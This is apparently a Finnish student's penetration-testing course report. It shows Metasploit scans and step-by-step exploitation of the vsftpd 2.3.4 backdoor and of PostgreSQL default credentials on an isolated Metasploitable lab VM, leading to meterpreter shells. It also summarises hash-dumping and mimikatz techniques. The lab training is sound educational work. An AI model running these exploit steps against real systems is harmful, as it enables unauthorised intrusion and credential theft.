# [H2 Social sploit](https://terokarvinen.com/tunkeutumistestaus/#h2-social-sploit) (Karvinen 2024)

## x) Lue/katso/kuuntele ja tiivistä

### Chapter 1: Approaching a Penetration Test Using Metasploit (Jaswal 2020)

#### Conducting a penetration test with Metasploit

Termistöä:

- Exploits: haavoittuvuuksia hyväksikäyttävä koodikokonaisuus. Suomeksi hyväksikäyttövälittäjä(?)
- Payload: hyötykuorma. Kohdekoneen hyväksikäytön jälkeen suoritettava koodi. Määrittelee kohteessa suoritettavat toimet.
- Auxiliary: lisämoduulit, jotka suorittavat esim. skannausta.
- Encoders: moduuleiden kooderi, jolla pyritään hämäämään puolustajaa muuttamalla hyökkäystyökaluja vaarattoman näköisiksi tai vaikeasti havaittaviksi.
- Meterpreter: hyötykuorma, joka injektoidaan kohteen työmuistiin. Hyötykuorma sisältää hyödynnettäviä funktioita/komentoja (esim. ``meterpreter> arp`` listaa kohteeseen kytketyt ip- ja mac-osoitteet).

#### Benefits of penetration testing using Metasploit

Metasploitin hyödyt verrattuna manuaalisiin tekniikoihin:

- Avoin lähdekoodi, jota aktiivisesti kehitetään.
  - Omien moduuleiden lisääminen mahdollista
- Tukee laajojen järjestelmien testausta.
  - Osoiteavaruudet nimeämiskäytäntöjen mukaan.
- Hyötykuormien vaihtaminen ja määrittely helppoa.
- "Puhdas poistuminen". On tärkeää, ettei kaada järjestelmää, josta yrittää poistua.
  - Edesauttaa uudelleenpääsyä järjestelmään.
- Tiedustelutiedon kerääminen.
  - Mahdollisuus kerätä tietoa taustaprosessina automatisoidusti tietokantaan.

#### Case study – reaching the domain controller

- Tiedustelu
  - Metasploitin ``db_nmap``, skannauksen tulokset tietokantaan.
  - Skannaamalla löytyy kohteen käyttöjärjestelmä.
  - Käyttöjärjestelmä tietäen ajetaan skripti, joka löytää tunnetun haavoittuvuuden.
- Threat Modeling
  - Metasploit ``search``-toiminto listaa käytössä olevia moduuleja tunnettuun haavoittuvuuteen.
  - ``vulns`` tallentaa tiedot haavoittuvuuksista tietokantaan
- Hyväksikäyttö ja pääsyn saanti
  - ``use <exploit/path/to/module>``, lataa moduulin.
  - ``show options`` listaa käytössä olevat parametrit ja luokittelee vaaditut/vaihtoehtoiset parametrit.
  - ``exploit``, lippu ``-j`` ajaa hyökkäyksen taustalla.
- Post-exploitation kung-fu
  - Siirtämällä hyökkäysprosessi powershellistä johonkin vähemmän epäilyttävään parannetaan hyökkäyksen piilossa pysymistä
  - Hyökkääjä tekaisee itsenä adminiksi päästäkseen domain controlleriin
  - Active Directorysta saadaa kaikkien käyttäjien salasanatiivisteet (``smart_hashdump``)
  - mimikatzilla saa mahdollisesti selkotekstinä käyttäjätunnuksia

## a) Harjoittelemme omassa virtuaaliverkossa, jossa on Kali ja Metaspoitable. Osoita testein, että 1) koneet eivät saa yhteyttä Internetiin 2) Koneet saavat yhteyden toisiinsa.

![image](https://github.com/user-attachments/assets/e16175fa-4d51-457a-ad6c-9fa8eca6f18f)![image](https://github.com/user-attachments/assets/e821aa16-23d2-4c84-9382-374c6c37dc63)
> Kuvat 1 & 2. Kali eikä Metasploitable saa yhteyttä Internetiin.

![image](https://github.com/user-attachments/assets/68f43f25-9c11-4e3b-8483-adf743219ea8)![image](https://github.com/user-attachments/assets/44804a7f-27e6-46df-a9be-98de9f696e14)
> Kuvat 3 & 4. Koneet saavat yhteyden toisiinsa.

## b) Ota Metasploit msfconsole käyttöön

![image](https://github.com/user-attachments/assets/a93668fc-77ae-4a1d-b79f-79f6028a1f05)
> Kuva 5. Msfconsolen alkunäkymä.

Metasploit Framework on tullut Kali-linuxin asennuksen yhteydessä. ``msfconsole`` on komento, joka avaa Metasploitin komentoriviliittymän.

## c) Etsi Metasploitable porttiskannaamalla (db_nmap -sn). Tarkista selaimella, että löysit oikean IP:n - Metasploitablen weppipalvelimen etusivulla lukee Metasploitable.

![image](https://github.com/user-attachments/assets/2d2eabc7-5e3d-4a71-92c9-db4a2a604701)
> Kuva 6. Error. Ei yhteyttä tietokantaan.

Komennon ``db_nmap -sn`` tuottaa virheviestin msfconsoleen; yhteyttä tietokantaan ei ole. Muistini mukaan alustin edellisellä oppitunnilla ensimmäisen tietokantani Metasploitia varten. Komento ``help`` neuvoo käyttämään komentoa ``db_connect`` muodostaakseen yhteyden. Mutta en ollut laittanut muistiin tietokannan tiedostopolkua tai muuta tarvittavaa tietoa (komentoparametrejä). Googlasin "how to start metasploit database" ja ensimmäinen ohje oli, että laita postgresql.service (daemon) päälle.

    sudo systemctl status postgresql.service    # inactive, disabled
    sudo systemctl enable postgresql.service    # inactive, enabled
    sudo systemctl start postgresql.service     # active, enabled

Hakutulos myös paljasti default-polun tietokannalle, kun käyttää komentoa ``msfdb init``. Näiden toimenpiteiden jälkeen kokeilin muodostaa msfconsolessa yhteyden (kuva 7).

![image](https://github.com/user-attachments/assets/277b9b0a-bbcd-41b2-bfbd-f85bba48add1)
> Kuva 7. Yhteys muodostettu eikä toista yhteyttä voida luoda.

Jos ``db_connect path/to/database.yml`` epäonnistuu, koska yhteys siihen on jo muodostettu, tarkoittaa tämä sitä, että postgresql.servicen käynnistäminen korjasi vian. Seuraavaksi kokeillaan uudestaan tehtävänannon komentoa. Lisätään siihen koko aliverkko parametriksi.

    db_nmap -sn 192.168.56.0/24    # käy läpi kaikki osoitteet verkko-osoiteavaruudessa 192.168.56.0 - 192.168.56.255

![image](https://github.com/user-attachments/assets/f2e57028-21a8-4200-93b5-c4dd33af9770)

> Kuva 8. Porttiskannauksen tulokset.

Tulokset ovat edellisen viikon tehtävien mukaiset ([h1 Hacker's journey](https://github.com/RenneJ/tunkeutumistestaus/blob/main/h1-hackers-journey.md#g-etsi-metasploitable-porttiskannaamalla-nmap--sn-tarkista-selaimella-ett%C3%A4-l%C3%B6ysit-oikean-ipn---metasploitablen-weppipalvelimen-etusivulla-lukee-metasploitable)). Tällä kertaa tulokset on tallennettu tietokantaan ja ovat Metasploit Frameworkin käytössä jatko-operaatioille.

![image](https://github.com/user-attachments/assets/5968064d-556a-4214-9831-918fbe599df9)
> Kuva 9. Oikeaa ip-osoitetta kutsuttu komennolla ``curl``.

## d) Porttiskannaa Metasploitable perusteellisesti. Tallenna tulokset Metasploitin tietokantoihin (db_nmap) ja tiedostoihin (nmap -oA foo).

    msf6 > db_nmap -A 192.168.56.101    # msfconsolessa laaja (-A) skannaus, tulokset tietokantaan
    user@kali > nmap -oA h2_ms2 -A 192.168.56.101  # kalin terminaalissa, tulokset tiedostoihin (-oA)

Ajot tehty eri terminaaleissa, jotta ne voidaan ajaa samaan aikaan. Komento ``nmap`` toimii yhtä hyvin msfconsolessa.

Itse tallensin tiedostot virtuaalikoneeni kotihakemiston juureen. Jos tiedostoja kertyy paljon, kannatan toimintamallia, jossa lokitiedostot tallennetaan ``/var/log/`` tiedostopolkuun omaan hakemistoon esim. ``nmap.log.d``.

![image](https://github.com/user-attachments/assets/ea902af7-ef8b-4dac-861b-c7d8bd40ee1e)
> Kuva 10. Lokitiedostot tallessa.

Skannaustuloksiin pääsee käsiksi mm. komennolla ``services`` msfconsolessa (kuva 11). Komento tarkistettu ``help`` tulosteesta.

![image](https://github.com/user-attachments/assets/fa93efcd-fcdd-4041-a2b1-937f1a5f3671)
> Kuva 11. Auki olevat portit Metasploitable 2 -koneessa.

## e) Tarkastele Metasploitin tietokantoihin tallennettuja tietoja komennoilla "hosts" ja "services". Kokeile suodattaa näitä listoja tai hakea niistä.

Aloitetaan siitä, että selvitetään mitä optioita on saatavilla komentoon ``services``. Lippu ``-h`` tai ``--help`` yleensä auttaa, niin tälläkin kertaa.

![image](https://github.com/user-attachments/assets/c2a0ff4e-5ec8-4830-ba7a-5c6ee1d32729)
> Kuva 12. Optiot ja porttisuodatus.

Vaikka help-ohjeissa ei mainittu porttivälien määrityksestä, päätin kokeilla määrittää portit yhdestä tuhanteen ``-p 1-1000``. Sehän onnistui (kuva 12).

## f) Vertaile nmap:n omaa tiedostoon tallennusta ja db_nmap:n tallennusta tietokantoihin. Mitkä ovat eri tiedostomuotojen ja Metasploitin tietokannan hyvät puolet?

Tiedostomuodot:

- file.xml
  - nätin näköinen raportti
  - "A key advantage of XML is that you do not need to write your own parser as you do for specialized Nmap output types such as grepable and interactive output. Any general XML parser should do." (nmap.org s.a.)

Jotta nmap xml-tiedoston saa auki selaimessa pitää ensin avata koneelle http-palvelin. Ainakaan oma versioni Mozilla Firefoxista (115.15.0esr) ei suostunut avaamaan xml-tiedostoa nätisti. Ongelmana on "CORS request not HTTP" (mdn web docs s.a. a). Selain ei suostu tietoturvasyistä lataamaan "ulkopuolisesta" lähteestä tyylitiedostoa. Jotta sain sen toimimaan, tein seuraavasti.

    cp /usr/share/nmap/nmap.xsl ~    # kopioidaan tyylitiedosto hakemistoon, jossa h2_ms2.xml tiedosto sijaitsee
    python3 -m http.server           # avataan testausserveri (mdn web docs s.a. b)
    nano h2_ms2.xml                  # file://path/to/xsl korvataan http://localhost:8000/nmap.xsl

Tämän jälkeen selaimessa: ``http://localhost:8000/h2_ms2.xml``.

![image](https://github.com/user-attachments/assets/a70d8dd3-8563-4f9f-a440-74e622f10e92)
> Kuva 13. XML-tiedosto tulostuu nätisti selaimessa.

- file.gnmap
  - grepable nmap
  - tämän pitäisi olla grep-ohjelman kanssa käypä, mutta en ymmärrä miten
  - lisäksi "deprecated" eli tätä toimintoa ei enää päivitetä

![image](https://github.com/user-attachments/assets/445fd64d-25cf-4ff2-852b-9d245d9cec02)
> Kuva 14. Ei kovinkaan grepable...

Todennäköisesti käytän tätä väärin. Epäintuitiivinen formaatti.

- file.nmap
  - standard nmap output
  - tämä tulostuu kun ajaa spesifioimatta output-formaattia

![image](https://github.com/user-attachments/assets/6891b6db-a6dd-41a4-9541-96695a8808f9)
> Kuva 15. Grepaus nmap-tiedostoon.

Grepaaminen nmap-tiedostoon on ainakin minun silmääni luettavampi.

## g) Murtaudu Metasploitablen vsftpd-palveluun

Seurasin Jacobsin (2024) ohjeita kohdasta 3 (Gaining Access) eteenpäin.

    search vsftpd    # etsii haavoittuvuuksia vsftpd-palvelusta
    use exploit/unix/ftp/vsftpd_234_backdoor    # valitsee haavoittuvuuden
    set RHOSTS 192.168.56.101    # lukoitsee kohteen
    run    # suorittaa exploitin
    
![image](https://github.com/user-attachments/assets/ea4c36b4-d2ce-4d6e-85d2-d104a2f2001d)
> Kuva 16. Metasploitablen juuressa.

## h) Päivitä äskeisen vsftpd-murron yhteydessä syntynyt sessio meterpretriin

Teron [vinkeistä](https://terokarvinen.com/tunkeutumistestaus/#h2-social-sploit) päättelin, että Ctrl + z siirtää session taustalle. Tämän jälkeen tarkistin ``sessions -h`` miten päivitetään sessio meterpreteriin.

    sessions -u 1

Tämä löytyikin myös Teron vinkeistä.

## i) Kerää levittäytymisessä (lateral movement) tarvittavaa tietoa metasploitablesta. Analysoi tiedot. Selitä, miten niitä voisi hyödyntää.

Kokeilin samankaltaisia askelia kuin jo testatussa tekniikassa: etsi haavoittuvuuksia ``search <service_name_as_keyword>``, ota käyttöön ``use <id>``, tutki optiot ``show options``, aseta vaaditut kentät ``set <required>`` ja aja ``exploit``. Tällä tavalla pääsin tilanteeseen, jota en osannut selvittää tai ymmärtää...

Käytin usean tunnin sunnuntai-illastani yrittäessä murtautua Metasploitable 2 ProFTPD 1.3.1 -palvelun kautta. Löysin ``search``-toiminnolla hyökkäyksen, joka hyödynsi tunnettua, tahallisesti asennettua takaporttia. En saanut sitä onnistumaan, edes [näiden](https://hackernoon.com/exploiting-the-proftpd-linux-server) ohjeiden avulla. 22h myöhemmin tajusin maanantaina, että versiot eivät täsmää :smiling_face_with_tear:... Oppimiskokemus ei ollut nautinnollinen, mutta kantapäiden kautta kovinkin tehokas. Ystävällisesti kehotan kanssaopiskelijoita varmistamaan versiot kohteesta ja hyökkäyksestä tarkasti.

Nöyrtyneenä, mutta uutta tarmoa täynnä, päätin kokeilla murtautumista eri haavoittuvuudesta, toisesta palvelusta. Valitsin ``services``-komennon tulosteesta PostgreSQL:n. Erityisen huomaavaisesti tarkastin versioinnin ja valitsin kohdan 23.

![image](https://github.com/user-attachments/assets/c2832b2e-a80e-4c83-a375-eea387ffd775)
> Kuva 17. Metasploitin PostgreSQL-moduulit.

Ensimmäisenä, moduulin käyttöönoton (``use 23``) jälkeen, tarkistin optioni ``show options``.

![image](https://github.com/user-attachments/assets/f038d9e4-5398-4ae1-bffc-8bdd292801e9)
> Kuva 18. ``linux/postgres/postgres_payload``-moduulin optiot.

Asetin seuraavat optiot ja käynnistin hyökkäyksen:

    set VERBOSE true
    set RHOSTS 192.168.56.101
    set LHOST 192.168.56.102
    exploit

Minulla ei ollut odotuksia, siitä mitä tämä hyökkäys tekee. Yllätyksekseni hyökkäys onnistuneesti avasi meterpreterin kohteessa.

![image](https://github.com/user-attachments/assets/cd8cb77c-e187-43a4-961b-2aa1f297f8fd)
> Kuva 19. Tunkeutuminen onnistui.

![image](https://github.com/user-attachments/assets/8fc35c8a-de65-42e4-a0f8-e04ba57ccf71)
> Kuva 20. Shell käytössä käyttäjänä postgres.

![image](https://github.com/user-attachments/assets/5b613761-8834-4f9f-8a60-8a5f4ee5b074)
> Kuva 21. Tietokannan hallinta.

Kuvan 18 optioista voi nähdä, että PASSWORD ja USERNAME ovat molemmat postgres. Nämä ovat oletuskirjautumistiedot postgres-tietokantaan.


## Lähteet

Jacobs, J. 2024. Exploiting vsftpd in Metasploitable 2. Luettavissa: https://medium.com/@jasonjayjacobs/exploiting-vsftpd-in-metasploitable-2-cf975ead1173 Luettu: 2024-11-03

Jaswal, N. 2020. Mastering Metasploit. Packt Publishing. Luettavissa: https://learning.oreilly.com/library/view/mastering-metasploit/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idTextAnchor017 Luettu: 2024-11-02

Karvinen, T. 2024. Tunkeutumistestaus. H2 Social sploit. Luettavissa: https://terokarvinen.com/tunkeutumistestaus/#h2-social-sploit Luettu: 2024-11-02

mdn web docs s.a. a. Reason: CORS request not HTTP. Luettavissa: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS/Errors/CORSRequestNotHttp Luettu: 2024-11-03

mdn web docs s.a. b. How do you set up a local testing server? Luettavissa: https://developer.mozilla.org/en-US/docs/Learn/Common_questions/Tools_and_setup/set_up_a_local_testing_server Luettu: 2024-11-03

nmap.org s.a. XML Output (-oX). Luettavissa: https://nmap.org/book/output-formats-xml-output.html Luettu: 2024-11-03
